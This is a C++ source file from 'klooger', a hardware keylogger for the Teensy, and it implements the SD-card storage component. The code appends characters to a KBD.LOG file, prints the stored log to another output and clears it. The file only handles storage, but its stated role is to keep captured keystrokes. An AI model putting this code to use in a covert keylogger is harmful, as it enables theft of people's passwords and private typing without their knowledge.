/*
 * klooger - a hardware keylogger based on the Teensy
 * Copyright (C) 2012 Michael Drost
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty
 * of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>.
 */
 
/*
 * This file contains the definition of the FileOutput class
 */
#include <SD.h>

#include "FileOutput.h"
#include "Debug.h"

#define LOGGER_FILENAME "KBD.LOG"

Sd2Card card;
SdVolume volume;
SdFile root;
SdFile file;

void blinkLED()
{
  delay(500); 
  pinMode(6, OUTPUT);
  digitalWrite(6, HIGH);   // set the LED on
  delay(500);                   // wait for 5 seconds
  digitalWrite(6, LOW);    // set the LED off
  delay(500);
}

//Error handler
void error(const char* str) {
  LOG("error: ");
  LOGLN(str);
  if (card.errorCode()) {
    LOG("SD error: ");
    LOGF(card.errorCode(), HEX);
    LOG(',');
    LOGF(card.errorData(), HEX);
    LOGLN("");
  }
  #ifdef LOGGING_ON
    //while(1);
  #endif
}

// store error strings in flash to save RAM
#define SECURE_CALL(b,str) SECURE_CALL_P(b,str)

bool FileOutput::SECURE_CALL_P(boolean cond,const char* errorstr)
{
  if(cond)
  {
    mInitialized = false;
    error(errorstr);   
  }
  return (!cond);
}


void FileOutput::print(char c)
{
  
  initialize();
  if(!file.open(&root, LOGGER_FILENAME, O_RDWR))
  {
    SECURE_CALL(!file.open(&root, LOGGER_FILENAME, O_WRITE),"file.open failed");
  }
  
  SECURE_CALL(!file.seekEnd(),"file.seekEnd failed");
  
  LOG("Writing to File: ");
  LOGLN(c);
  SECURE_CALL(!file.print(c),"file.print failed");
  SECURE_CALL(!file.close(),"file.close failed");
}

void FileOutput::prints(const char* c)
{
  
  initialize();
  if(!file.open(&root, "KBD.LOG", O_RDWR))
  {
    SECURE_CALL(!file.open(&root, "KBD.LOG", O_WRITE|O_CREAT),"file.open failed");
  }
  
  SECURE_CALL(!file.seekEnd(),"file.seekEnd failed");
  
  LOG("Writing to File: ");
  LOGLN(c);
  SECURE_CALL(!file.print(c),"file.print failed");
  if(SECURE_CALL(!file.close(),"file.close failed")) mInitialized = true; //if closes the file regularily it seems to be initialized
}

FileOutput::FileOutput():
mInitialized(false)
{
  //blinkLED();
}



void FileOutput::initialize()
{
   if(!mInitialized)
   {
     mInitialized = true;
     
     // initialize the SD card at SPI_HALF_SPEED to avoid bus errors with
     // breadboards.  use SPI_FULL_SPEED for better performance.
     //  if (!card.init(SPI_HALF_SPEED)) error("card.init failed");
     //SECURE_CALL(!card.init(SPI_HALF_SPEED),"card.init failed"); 
     SECURE_CALL(!card.init(SPI_FULL_SPEED),"card.init failed"); 

     // initialize a FAT volume
     SECURE_CALL(!volume.init(&card),"volume init failed");

     // open the root directory
     SECURE_CALL(!root.openRoot(&volume),"openRoot failed");
   }
}

void FileOutput::printToOutput(Output* out)
{
  SECURE_CALL(!file.open(&root, "KBD.LOG", O_READ),"open File for Read failed");
  char msg[20];
  int len;

  out->prints("----- LOG start -----\n");
  while(len = file.read(msg,19))
  {
    msg[len] = '\0';
    out->prints(msg);
    delay(100);
  }
  out->prints("\n----- LOG end -----\n");
  SECURE_CALL(!file.close(),"file.close failed");
}
void FileOutput::clear()
{
  SECURE_CALL(!file.remove(&root,"KBD.LOG"),"file.remove failed");
  SECURE_CALL(!file.open(&root, "KBD.LOG", O_WRITE|O_CREAT),"file.open failed");
  SECURE_CALL(!file.print("CLEARED"),"file.print failed");
  SECURE_CALL(!file.close(),"file.close failed");
}
